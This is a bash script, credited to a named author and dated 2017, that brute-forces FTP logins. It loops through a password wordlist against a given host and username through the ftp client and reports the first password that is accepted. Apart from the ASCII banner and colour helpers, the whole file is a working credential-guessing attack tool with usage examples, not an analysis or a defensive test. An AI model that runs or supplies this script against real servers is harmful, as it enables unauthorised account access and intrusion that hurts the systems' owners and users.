#!/bin/bash

#
# Simple script to brute force in protocol ftp
# Date: 2017/07/18 - version 0.1
#
# Author: João Lucas <joaolucas@linuxmail.org>



function_colors() {
	escape="\033";
	white="${escape}[0m";
	red="${escape}[31m";
	green="${escape}[32m";
	yellow="${escape}[33m";
	blue="${escape}[34m";
	cyan="${escape}[36m";
	reset="${escape}[0m";
}

function_banner(){

cat << EOF


88            ad88    ad88
88           d8V     d8V     ,d
88           88      88      88
88,dPPYba, x0BRUTE x0FORCE x0FTPxz 8b,dPPYba,
88P'    "8a  88      88      88    88P     V8a
88       d8  88      88      88    88       d8
88b,   ,a8V  88      88      88,   88b,   ,a8n
8YVYbbd8VN   88      88      VY888 88ddYbbdPV
                                   88
	Author: João Lucas         88

EOF

}


function_usage() {
	cat << EOF

Simple script to brute force in protocol ftp

Usage: $0 -t <host|ip> -w <wordlist> -u <user>
Example: $0 -t 192.168.0.1 -w /home/user/rockyou.txt -u admin

Author: João Lucas <joaolucas@linuxmail.org>

EOF

exit 1;
}


function_bfftp() {
	testpass=$(ftp -n "$1" << _CONECTION
	quote USER $2
	quote PASS $3
	quit
_CONECTION

)


if test "$testpass" = "Login incorrect."; then
	return 1
else
	return 0
fi


}

while getopts t:w:u: opt; do
	case $opt in
		"t") host="${OPTARG}" ;;
		"w") wordlist="${OPTARG}" ;;
		"u") user="${OPTARG}" ;;
		"*") function_usage ;;
	esac
done


[ $host ] || function_usage;
[ $wordlist ] || function_usage;
[ $user ] || function_usage;

function_colors;
function_banner;

echo -e "\n x0[${blue}  TARGET  ${white}]: $host\n x0[${blue}   USER   ${white}]: $user\n x0[${blue} WORDLIST ${white}]: `wc -l $wordlist | awk '{print $1}'` \n"



for password in $(cat $wordlist); do
	echo -e "[${yellow}  TEST  ${white}]${white} Testing the password: ${cyan} $password"
	test=$(function_bfftp $host $user $password)
	result=$(echo $?)

	if test $result -eq 1; then
		echo -e "[${red} FAILED ${white}] Password incorrect! \n"
	else
		echo -e "[${green}   OK   ${white}] Password correct: ${green} $password"
		break
	fi
done
